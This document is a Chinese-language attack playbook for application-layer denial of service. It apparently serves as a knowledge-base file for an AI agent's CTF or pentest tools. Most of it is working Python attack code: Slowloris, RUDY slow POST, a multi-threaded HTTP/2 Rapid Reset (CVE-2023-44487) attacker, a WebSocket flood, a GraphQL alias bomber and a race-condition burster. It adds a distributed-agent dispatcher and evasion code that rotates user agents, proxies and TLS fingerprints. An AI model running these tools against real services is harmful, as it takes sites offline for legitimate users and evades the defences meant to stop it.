# Application-Layer DoS

## 场景

攻击者利用应用层协议特性，以极低带宽消耗耗尽目标服务器的并发连接池、线程池或 Worker 进程，使正常用户无法访问服务。此类攻击区别于网络层 volumetric 攻击，核心在于利用协议语义缺陷而非纯带宽。

典型目标：
- Web 服务器 (Nginx, Apache, IIS)
- API Gateway (Kong, Envoy, AWS ALB)
- WebSocket 端点 (Socket.IO, ws, SignalR)
- GraphQL 端点 (Apollo, Hasura, graphene)
- HTTP/2 reverse proxy (nginx, h2o, Caddy)

## 输入信号

- 单个源 IP 建立大量半开连接 (SYN_RCVD / CLOSE_WAIT)
- 连接持续时间异常长，请求体发送极慢 (0-1 byte/sec)
- HTTP Header 逐字节发送，尾部 `\r\n\r\n` 永不完整
- HTTP/2 单连接上每秒数千个 RST_STREAM 帧，无实际数据
- WebSocket 连接数飙升，但帧间隔极长或发空帧
- GraphQL 查询中大量重复别名，响应体积非线性增长
- 相同请求模式在不同时间窗口从不同 IP 重复出现 (分布式 Slowloris)

---

## 方法 1: HTTP Slowloris — 不完全请求 + 连接耗尽

### 原理

Slowloris 向目标发送 **不完全的 HTTP 请求**：只发送 `GET / HTTP/1.1\r\n` 和若干 Header，但永远不发送最终的 `\r\n\r\n`。服务器会保持该连接打开以等待请求完成，最终耗尽 `MaxClients` / `worker_connections`。

Apache 的 `mpm_prefork` 模式特别容易受害，每个连接占用一个完整进程。Nginx 的事件驱动模型较抗，但调整不当同样会耗尽 `worker_connections`。

### 攻击计算

```
设 MaxClients = 256, 每个连接保持 300 秒
则攻击者需要: 256 个并发连接 / 攻击者
分布式时每个 IP 仅需 5-10 个连接即可填满后端

连接速率要求: 256 connections / 300s ≈ 0.85 conn/sec
带宽需求每条连接 < 100 bytes 每 10 秒
总带宽 ≈ 256 × 100 ÷ 10 = 2560 bytes/sec ≈ 20 Kbps
```

### 代码: Python 异步 Slowloris (asyncio)

```python
import asyncio
import ssl
import random
from typing import Optional

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
]

class AsyncSlowloris:
    """异步 Slowloris — 每个连接消耗极少量资源"""

    def __init__(self, host: str, port: int = 80, ssl: bool = False,
                 num_conns: int = 400, keepalive_sec: int = 600):
        self.host = host
        self.port = port
        self.use_ssl = ssl
        self.num_conns = num_conns
        self.keepalive = keepalive_sec
        self.connections: set[asyncio.Transport] = set()

    def _build_partial_request(self) -> bytes:
        ua = random.choice(USER_AGENTS)
        # 构造不完全请求 — 缺少末尾 \r\n\r\n
        headers = (
            f"GET /{random.randint(1, 9999)} HTTP/1.1\r\n"
            f"Host: {self.host}\r\n"
            f"User-Agent: {ua}\r\n"
            f"Accept: text/html,application/xhtml+xml\r\n"
            f"Accept-Language: en-US,en;q=0.5\r\n"
            # 自定义 header 延长连接
            f"X-KeepAlive: {'A' * random.randint(1024, 4096)}\r\n"
            # 故意不发送结尾 \r\n
        )
        return headers.encode()

    async def _maintain_one(self) -> None:
        """维持一个慢速连接"""
        loop = asyncio.get_event_loop()
        try:
            while True:
                reader, writer = await asyncio.wait_for(
                    asyncio.open_connection(
                        self.host, self.port, ssl=self.use_ssl,
                        limit=1024  # 小 buffer 避免意外读取过多
                    ),
                    timeout=10
                )
                # 发送部分请求
                partial = self._build_partial_request()
                writer.write(partial)
                await writer.drain()

                # 每 30-60 秒发送一个额外的 partial header 维持连接
                while True:
                    await asyncio.sleep(random.uniform(30, 60))
                    # 发送一小段 header 续命
                    keep_alive_chunk = f"X-KeepAlive: {random.randint(1, 9999)}\r\n"
                    writer.write(keep_alive_chunk.encode())
                    await writer.drain()

        except (ConnectionRefusedError, ConnectionResetError,
                TimeoutError, OSError):
            # 等待后重试
            await asyncio.sleep(random.uniform(5, 15))

    async def attack(self) -> None:
        tasks = [self._maintain_one() for _ in range(self.num_conns)]
        await asyncio.gather(*tasks, return_exceptions=True)

    def stop(self):
        """优雅停止 — 关闭所有连接"""
        for t in self.connections:
            t.close()


# 使用:
# lorris = AsyncSlowloris("target.com", 80, num_conns=400)
# try:
#     asyncio.run(lorris.attack())
# except KeyboardInterrupt:
#     lorris.stop()
```

### 分布式 Slowloris

```python
import asyncio
import aiohttp

async def distributed_slowloris(master_node: str, target: str,
                                agents: list[str], conns_per_agent: int = 50):
    """通过 agent 节点分发 Slowloris 攻击"""
    async with aiohttp.ClientSession() as session:
        for agent in agents:
            # 向每个 agent 发送攻击指令
            await session.post(
                f"http://{agent}:8080/attack",
                json={
                    "target": target,
                    "method": "slowloris",
                    "connections": conns_per_agent,
                    "duration_sec": 300,
                }
            )

    print(f"[*] Deployed {len(agents) * conns_per_agent} slow connections")
```

---

## 方法 2: R-U-Dead-Yet (RUDY) — Slow POST Body

### 原理

RUDY 与 Slowloris 类似，但利用 **POST 请求的 Content-Length** 声明一个巨大的 body，然后以极慢速度逐字节发送。服务器分配 buffer 等待完整 body，该 buffer 在整个请求期间被占用。

Content-Length: 1000000000 (声明 1GB body)
实际发送: 1 byte / 10秒 → 理论上单个连接可维持数月

### 代码

```python
import socket
import time
import random

def rudy_attack(target_host: str, target_port: int = 80,
                content_length: int = 1_000_000_000):
    """R-U-Dead-Yet: 极慢速 POST body 注入"""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((target_host, target_port))
    sock.settimeout(None)  # 永不超时

    # 构造起始部分
    body_prefix = "A" * 1024  # 先发 1KB 迷惑服务器
    headers = (
        f"POST /form.php HTTP/1.1\r\n"
        f"Host: {target_host}\r\n"
        f"Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: {content_length}\r\n"
        f"Connection: keep-alive\r\n"
        f"\r\n"
        f"{body_prefix}"
    )
    sock.send(headers.encode())

    # 逐字节发送剩余的 body
    bytes_sent = len(body_prefix)
    while bytes_sent < content_length:
        # 每 5-30 秒发送 1 个字节
        time.sleep(random.uniform(5, 30))
        sock.send(b"A")
        bytes_sent += 1

    sock.close()
```

### RUDY 绕过 keepalive_timeout

大部分服务器有 `keepalive_timeout` (通常 65-300s)，但声明大 Content-Length 后，服务器在 body 未完成前不会释放连接 — timeout 仅适用于 **请求间** 空闲，而非 **请求内** 空闲。RUDY 正是利用此间隙。

---

## 方法 3: HTTP/2 Rapid Reset (CVE-2023-44487)

### 原理

HTTP/2 允许在单条 TCP 连接上多路复用多个 stream。客户端发送 `HEADERS` 帧创建 stream，可立即发送 `RST_STREAM` 帧取消。**核心漏洞**：服务器在处理 `HEADERS` 帧时分配内部资源 (解析 header、分配流 ID、调度到 worker)，而在处理 `RST_STREAM` 回收资源时存在 **重置-创建竞争窗口** — 在回收完成前，攻击者可以极快速度创建-重置流，使服务器持续处于资源分配/回收的忙循环中。

**受影响**:
- HTTP/2 实现几乎全部受影响:
  - nginx (< 1.25.3): 单连接每秒 10 万+ stream 重置
  - Apache httpd (< 2.4.58)
  - Envoy (< 1.27.0)
  - Go net/http (< 2.0.0)
  - Node.js http2 (< 20.8.0)
  - Amazon ALB / CloudFront

### 放大系数计算

```
HTTP/2 单连接:
  传统 HTTP/1.1 请求极限: ~100 RPS (受 TCP 窗口限制)
  HTTP/2 stream max: 2^31 - 1 ≈ 2.1B 流

攻击效率:
  每个 HEADERS + RST_STREAM 帧对 ≈ 100-200 bytes
  1 Gbps 链路可承载 ≈ 625,000 帧对/秒
  单条连接 → 等效 50,000 RPS 的拒绝服务效果

  nginx 1.25.2 实测: 单连接 250,000 stream 重置/秒
  等效 HTTP/1.1 攻击: 需要 2,500 个并发连接
```

### 代码: HTTP/2 Rapid Reset PoC

```python
import h2.connection
import h2.events
import h2.config
import socket
import ssl
import time
import threading
from typing import Optional

class H2RapidReset:
    """HTTP/2 Rapid Reset (CVE-2023-44487) 单连接 PoC"""

    def __init__(self, host: str, port: int = 443):
        self.host = host
        self.port = port
        self.sock: Optional[ssl.SSLSocket] = None
        self.conn: Optional[h2.connection.H2Connection] = None
        self.stream_count = 0

    def _connect(self):
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE

        raw_sock = socket.create_connection((self.host, self.port), timeout=10)
        self.sock = ctx.wrap_socket(raw_sock, server_hostname=self.host)

        config = h2.config.H2Configuration(
            client_side=True,
            header_encoding='utf-8',
            validate_outbound_headers=False  # 允许任意 header
        )
        self.conn = h2.connection.H2Connection(config=config)
        self.conn.initiate_connection()
        self.sock.sendall(self.conn.data_to_send())

    def _create_and_reset(self) -> int:
        """创建一个 stream 并立即重置，返回 stream ID"""
        stream_id = self.conn.get_next_available_stream_id()
        headers = [
            (':method', 'GET'),
            (':path', '/'),
            (':authority', self.host),
            (':scheme', 'https'),
        ]
        self.conn.send_headers(stream_id, headers, end_stream=False)
        self.conn.reset_stream(stream_id, error_code=0x0)  # NO_ERROR
        self.stream_count += 1
        return stream_id

    def _flush_and_read(self):
        """发送数据并消费服务器响应"""
        data = self.conn.data_to_send()
        if data:
            self.sock.sendall(data)

        # 非阻塞读取 — 丢弃所有响应
        self.sock.settimeout(0.001)
        try:
            while True:
                chunk = self.sock.recv(65535)
                if not chunk:
                    break
                events = self.conn.receive_data(chunk)
                for event in events:
                    if isinstance(event, h2.events.WindowUpdated):
                        pass  # 忽略流控更新
        except (socket.timeout, ssl.SSLWantReadError):
            pass
        finally:
            self.sock.settimeout(None)

    def attack(self, duration_sec: int = 30) -> int:
        """执行 Rapid Reset 攻击，返回创建的 stream 总数"""
        self._connect()
        deadline = time.time() + duration_sec

        while time.time() < deadline:
            for _ in range(1000):  # 批量创建 1000 个
                try:
                    self._create_and_reset()
                except Exception:
                    break

            self._flush_and_read()

            # 每 10000 stream 报告一次
            if self.stream_count % 10000 < 1000:
                elapsed = time.time() - (deadline - duration_sec)
                rate = self.stream_count / elapsed if elapsed > 0 else 0
                print(f"[*] {self.stream_count} streams, {rate:.0f} streams/sec")

        return self.stream_count


# 并行多连接攻击
def concurrent_h2_attack(host: str, connections: int = 10,
                         duration_sec: int = 30):
    """多个 HTTP/2 连接并行 Rapid Reset"""
    results = []

    def worker(idx: int):
        rz = H2RapidReset(host)
        count = rz.attack(duration_sec=duration_sec)
        results.append(count)
        print(f"[{idx}] Done: {count} streams")

    threads = []
    for i in range(connections):
        t = threading.Thread(target=worker, args=(i,))
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

    total = sum(results)
    print(f"\n[!] Total: {total} streams across {connections} connections")
    return results
```

### CVE-2023-44487 真实影响

| 受影响方 | 影响 | 修复版本 |
|---------|------|---------|
| nginx | CPU 100%, 拒绝服务 | 1.25.3 |
| Apache httpd | Worker 耗尽 | 2.4.58 |
| Envoy | 内存 OOM | 1.27.0 |
| Go net/http | CPU 100% | go1.21.4 |
| Node.js | Event loop 阻塞 | 20.8.0 / 18.19.0 |
| Amazon CloudFront | 抖动/延迟 | 已修复 (后端) |
| Google Cloud LB | 内部缓解 | GCP 自动 |

---

## 方法 4: WebSocket DoS

### 原理

WebSocket 在建立连接后保持长连接。攻击者可以：
1. **连接洪泛**：建立大量 WebSocket 连接，占据文件描述符
2. **帧碎片化**：发送分片帧，每个分片之间间隔极长，保持连接活跃
3. **大帧放大**：声明巨大 payload length (2^63)，服务器预分配 buffer
4. **Ping/Pong 风暴**：频繁 ping 迫使服务器响应 pong，消耗 CPU

### WebSocket 帧格式

```
 0                   1                   2                   3
 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|F|R|R|R| opcode|M| Payload len  | Extended payload length     |
|I|S|S|S|  (4)  |A|     (7)     |             (16/64)           |
|N|V|V|V|       |S|             |   (if payload len==126/127)   |
| |1|2|3|       |K|             |                               |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
```

### 代码: WebSocket 连接洪泛 + 帧碎片化

```python
import asyncio
import struct
import random
import os

class WebSocketFlood:
    """WebSocket 连接洪泛 + 帧碎片攻击"""

    def __init__(self, host: str, port: int, path: str = "/ws",
                 ssl: bool = False):
        self.host = host
        self.port = port
        self.path = path
        self.use_ssl = ssl

    @staticmethod
    def _make_mask() -> bytes:
        return os.urandom(4)

    @staticmethod
    def _mask_data(data: bytes, mask: bytes) -> bytes:
        return bytes(b ^ mask[i % 4] for i, b in enumerate(data))

    def _build_ws_frame(self, payload: bytes, opcode: int = 0x2,
                        fin: bool = True, mask: bool = True) -> bytes:
        """手动构造 WebSocket 帧"""
        frame = bytearray()
        frame.append((0x80 if fin else 0x00) | (opcode & 0x0F))

        mask_bit = 0x80 if mask else 0x00
        length = len(payload)

        if length < 126:
            frame.append(mask_bit | length)
        elif length < 65536:
            frame.append(mask_bit | 126)
            frame.extend(struct.pack('>H', length))
        else:
            frame.append(mask_bit | 127)
            frame.extend(struct.pack('>Q', length))

        if mask:
            mk = self._make_mask()
            frame.extend(mk)
            frame.extend(self._mask_data(payload, mk))
        else:
            frame.extend(payload)

        return bytes(frame)

    def _build_connect_request(self) -> bytes:
        """构造 WebSocket Upgrade 请求"""
        key = base64.b64encode(os.urandom(16)).decode()
        return (
            f"GET {self.path} HTTP/1.1\r\n"
            f"Host: {self.host}:{self.port}\r\n"
            f"Upgrade: websocket\r\n"
            f"Connection: Upgrade\r\n"
            f"Sec-WebSocket-Key: {key}\r\n"
            f"Sec-WebSocket-Version: 13\r\n"
            f"\r\n"
        ).encode()

    async def _maintain_ws(self, reader: asyncio.StreamReader,
                           writer: asyncio.StreamWriter):
        """维持 WebSocket 连接 — 发送碎片帧"""
        try:
            while True:
                # 发送一个分片帧 (fin=0, opcode=0x0=continuation)
                chunk = os.urandom(random.randint(1, 32))
                frag = self._build_ws_frame(chunk, opcode=0x0, fin=False)
                writer.write(frag)
                await writer.drain()

                # 长时间等待后再发送下一个分片
                await asyncio.sleep(random.uniform(30, 120))

        except (ConnectionResetError, ConnectionClosedError):
            pass

    async def connect_one(self) -> bool:
        """建立单个 WebSocket 连接 (使用 ws:// 协议)"""
        try:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(self.host, self.port,
                                       ssl=self.use_ssl),
                timeout=10
            )
            # 发送 Upgrade 请求
            req = self._build_connect_request()
            writer.write(req)
            await writer.drain()

            # 读取 Upgrade 响应
            resp = await asyncio.wait_for(
                reader.readuntil(b"\r\n\r\n"), timeout=5
            )
            if b"101 Switching Protocols" in resp:
                asyncio.ensure_future(self._maintain_ws(reader, writer))
                return True
        except Exception:
            pass
        return False

    async def flood(self, num_connections: int):
        """创建大量 WebSocket 连接"""
        tasks = [self.connect_one() for _ in range(num_connections)]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        success = sum(1 for r in results if r is True)
        print(f"[*] Established {success}/{num_connections} WS connections")
        # 保持运行
        await asyncio.Event().wait()
```

---

## 方法 5: GraphQL Batching DoS — Alias-Based Query Amplification

### 原理

GraphQL 允许在单个请求中通过 **别名 (alias)** 查询同一字段多次：

```graphql
query {
  a1: user(id:1) { name }
  a2: user(id:2) { name }
  # ... 重复数百次
  a500: user(id:500) { name }
}
```

每个别名对应一次数据库查询 — 单个 HTTP 请求可触发数百次后端查询。攻击者可以：

1. **别名轰炸**：单个请求中含数千个别名，全部指向高开销查询
2. **深度嵌套**：`__typename` 深层递归，返回指数级 JSON 体积
3. **循环依赖**：利用接口的循环引用构造无限深查询树
4. **查询复杂度放大**：`pageSize=100000` + 关联对象预加载

### 攻击向量放大计算

```
别名数量: N = 1000
每个别名查询: user { posts { comments { author } } }
每查询数据库请求: ~6 次 (user + posts + comments * N + author * N)

单次 HTTP 请求触发的数据库操作:
  1000 × 6 = 6000 次 DB query

响应体积: ~200KB × 1000 = 200MB

代价比:
  攻击者带宽: ~50 KB (请求体)
  服务器处理: ~500 MB 内存 + 100% CPU × 10s
  放大系数: ~10,000x
```

### 代码: GraphQL Depth Bomber

```python
import asyncio
import aiohttp
import json
import random

class GraphQLBomber:
    """GraphQL alias-based DoS"""

    def __init__(self, endpoint: str, query_field: str = "user",
                 max_aliases: int = 2000):
        self.endpoint = endpoint
        self.field = query_field
        self.max_aliases = max_aliases

    def _build_alias_query(self, alias_count: int,
                           nested_depth: int = 1) -> str:
        """构建别名轰炸查询"""
        aliases = []
        for i in range(alias_count):
            alias_name = f"a{i}_{random.randint(0, 999999)}"
            # 每 50 个 alias 换一次参数值，避免缓存
            arg = i % 100 + 1
            aliases.append(f"  {alias_name}: {self.field}(id:{arg}) {{")

            # 嵌套层
            obj = "id\n    name\n    email"
            for _ in range(nested_depth):
                obj = f"{{\n      id\n      name\n      {obj}\n    }}"
            aliases[-1] += f"\n    {obj}\n  }}"

        return "query {\n" + "\n".join(aliases) + "\n}"

    def _build_deeply_nested_query(self, depth: int) -> str:
        """构建深度嵌套查询"""
        inner = "__typename"
        fields = ["id", "name", "__typename"]
        for _ in range(depth):
            inner = "{" + " ".join(fields) + f" nested {inner} }}" if depth > 1 \
                    else "{" + " ".join(fields) + "}"
        # 实际构造可能不同，这里用 recursive fragment
        parts = ["fragment Deep on Node {"]
        for i in range(depth):
            parts.append(f"  a{i}: children {{ __typename ...Deep }}")
        parts.append("}")
        return "\n".join(parts)

    async def _send_query(self, session: aiohttp.ClientSession,
                          query: str) -> tuple[int, int]:
        """发送查询并返回 (status, response_size_bytes)"""
        try:
            async with session.post(
                self.endpoint,
                json={"query": query},
                headers={"Content-Type": "application/json"},
                timeout=aiohttp.ClientTimeout(total=30)
            ) as resp:
                body = await resp.read()
                return resp.status, len(body)
        except (asyncio.TimeoutError, aiohttp.ClientError) as e:
            return 0, 0

    async def bomb(self, concurrency: int = 10,
                   queries_per_conn: int = 50):
        """并发别名轰炸"""
        async with aiohttp.ClientSession() as session:
            tasks = []
            for _ in range(queries_per_conn):
                q = self._build_alias_query(
                    alias_count=min(self.max_aliases, random.randint(500, 1500)),
                    nested_depth=random.randint(0, 2)
                )
                tasks.append(self._send_query(session, q))

            results = await asyncio.gather(*tasks, return_exceptions=True)

        stats = {"timeout": 0, "error": 0, "success": 0, "max_bytes": 0}
        for r in results:
            if isinstance(r, tuple):
                status, size = r
                if status == 200:
                    stats["success"] += 1
                stats["max_bytes"] = max(stats["max_bytes"], size)
            else:
                stats["error"] += 1

        return stats

    async def probe_depth_limit(self):
        """探测目标 GraphQL 的 depth limit 和 alias limit"""
        async with aiohttp.ClientSession() as session:
            # 二分法找 alias limit
            lo, hi = 10, 10000
            while lo < hi:
                mid = (lo + hi) // 2
                q = self._build_alias_query(mid)
                status, _ = await self._send_query(session, q)
                if status == 200:
                    lo = mid + 1
                else:
                    hi = mid

            alias_limit = lo
            # 二分数 depth limit
            dlo, dhi = 1, 100
            while dlo < dhi:
                mid = (dlo + dhi) // 2
                q = self._build_deeply_nested_query(mid)
                status, _ = await self._send_query(session, q)
                if status == 200:
                    dlo = mid + 1
                else:
                    dhi = mid

            depth_limit = dlo

        return {"alias_limit": alias_limit, "depth_limit": depth_limit}
```

---

## 方法 6: Race Condition Window DoS — TOCTOU 资源锁定

### 原理

利用 TOCTOU (Time-of-Check-Time-of-Use) 竞争窗口，在极短时间内发送多个请求以绕过速率限制、耗尽配额或锁定共享资源。

典型场景：
- **配额耗尽**：免费 API 每分钟 100 次 → 在 1ms 窗口内发送 200 次请求，全部通过
- **库存锁定**：抢购场景下锁定所有商品库存，阻塞正常交易
- **登录锁定**：触发多次失败登录锁定后，在锁定生效前继续尝试

### 代码: Race Window 并发器

```python
import asyncio
import aiohttp
import time

class RaceConditionDoS:
    """利用竞争窗口并发请求耗尽资源配额"""

    def __init__(self, endpoint: str):
        self.endpoint = endpoint

    async def race_burst(self, num_requests: int = 200) -> dict:
        """在单次 event loop 轮次中并发发送所有请求"""
        async def _send(session: aiohttp.ClientSession, idx: int):
            try:
                async with session.get(self.endpoint) as resp:
                    body = await resp.read()
                    return (idx, resp.status, len(body))
            except Exception as e:
                return (idx, 0, 0)

        async with aiohttp.ClientSession() as session:
            # 使用 gather 确保所有请求同时进入网络栈
            tasks = [asyncio.ensure_future(_send(session, i))
                     for i in range(num_requests)]

            # 模拟 race window: 确保 to 请求在单个时间片内发出
            start = time.monotonic()
            results = await asyncio.gather(*tasks, return_exceptions=True)
            elapsed = time.monotonic() - start

        status_counts = {}
        for r in results:
            if isinstance(r, tuple):
                _, status, _ = r
                status_counts[status] = status_counts.get(status, 0) + 1

        return {
            "total": num_requests,
            "elapsed_ms": elapsed * 1000,
            "status_counts": status_counts,
            "rate": num_requests / elapsed if elapsed > 0 else float('inf')
        }

    async def race_renewal(self, interval_sec: float = 0.5):
        """持续竞争 — 每 interval 秒发送一组并发请求"""
        while True:
            result = await self.race_burst(num_requests=50)
            print(f"[*] Burst: {result['rate']:.0f} req/s, "
                  f"statuses: {result['status_counts']}")
            await asyncio.sleep(interval_sec)
```

---

## 检测规避技术

### 1. 用户代理轮换

```python
import random

UA_POOL = [
    # 最新 Chrome
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    # 最新 Firefox
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) "
    "Gecko/20100101 Firefox/126.0",
    # Safari
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) "
    "AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",
    # Edge
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0",
    # 移动端
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) "
    "AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148",
    # Googlebot
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
]

def rotate_ua() -> str:
    return random.choice(UA_POOL)
```

### 2. 源 IP 轮换 (代理 + 住宅 IP)

```python
PROXY_LIST = [
    "socks5://user:pass@proxy1:1080",
    "socks5://user:pass@proxy2:1080",
    "http://user:pass@proxy3:3128",
]

async def round_robin_proxy(requests_session, proxy_cycle=None):
    if proxy_cycle is None:
        proxy_cycle = itertools.cycle(PROXY_LIST)
    return next(proxy_cycle)
```

### 3. TLS 指纹随机化

```python
# 使用 curl-impersonate 或 tls-client 改变 JA3 指纹
import tls_client

session = tls_client.Session(
    client_identifier="chrome_125",
    random_tls_extension_order=True
)
# 自动随机化 TLS 指纹，避开基于 JA3 的检测
```

---

## 攻击链

```
发现阶段:
  1. 识别目标协议 (HTTP/1.1 / HTTP/2 / WS / GraphQL)
  2. 探测连接限制 (MaxClients / worker_connections / ulimit)
  3. 确定最脆弱的协议层

Slowloris 链:
  HTTP Keep-Alive 半开 → 连接耗尽 → 503 Service Unavailable → 影响验证

RUDY 链:
  POST 大 Content-Length → 慢速 body → 请求 buffer 耗尽 → Worker 阻塞

HTTP/2 Rapid Reset 链:
  协商 h2 → 创建 stream → 立即 RST_STREAM → 每秒 10万+ 重置 → CPU 100%

WebSocket 链:
  Upgrade → 101 → 碎片帧保持 → 连接数 MaxConn → 新连接被拒

GraphQL 链:
  别名轰炸 → DB 连接池满 → 查询超时 → 正常请求排队 → cascading failure

Race condition 链:
  并发请求 → 配额窗口穿透 → 资源锁定 → 正常用户资源不可用
```

## MCP 工具映射

| 攻击步骤 | MCP 工具 | 说明 |
|---------|---------|------|
| 初始探测 | `http_probe` | 探测目标 Web 服务器协议和响应 |
| 漏洞搜索 | `kb_router` | 搜索 http2_rapid_reset / websocket_dos 等技术 |
| 技术查阅 | `kb_read_file` | 读取本文件或相关协议攻击技术 |
| CTF 工具 | `run_ctf_tool` | 调用 dirsearch 等辅助发现 |

## 参考资料

1. CVE-2023-44487 — HTTP/2 Rapid Reset (2023.10)
2. CVE-2024-27316 — HTTP/2 CONTINUATION flood (2024.04)
3. "Slowloris HTTP DoS" — Robert Hansen (RSnake), 2009
4. R-U-Dead-Yet (RUDY) — Van Hauser / THC, 2010
5. "GraphQL DoS: Query Complexity Analysis" — Apollo blog
6. Go net/http CVE-2023-44487 advisory
7. nginx HTTP/2 Rapid Reset mitigation: `http2_max_concurrent_streams`
8. Amazon AWS: CVE-2023-44487 impact on ALB/CloudFront
9. "Timing the Code: Exploiting TOCTOU Races" — Schwarz et al., IEEE S&P
10. RFC 9113 — HTTP/2 Stream Multiplexing

## 证据与验证闭环

- 保存 baseline 与单变量 probe 的完整请求、响应状态、关键响应头和正文摘要。
- 将“响应差异”与服务端副作用分开记录；只有权限、状态、数据或 Flag 可重复变化才算确认。
- 从全新 session/重置状态最小化重放，记录依赖、并发参数、时间窗口及失败样本。
- 输出统一放入 `exports/ctf-website/<case>/`，凭据只用 `REDACTED` 占位，自动检索 `flag{}`、`CTF{}`、`DASCTF{}`。
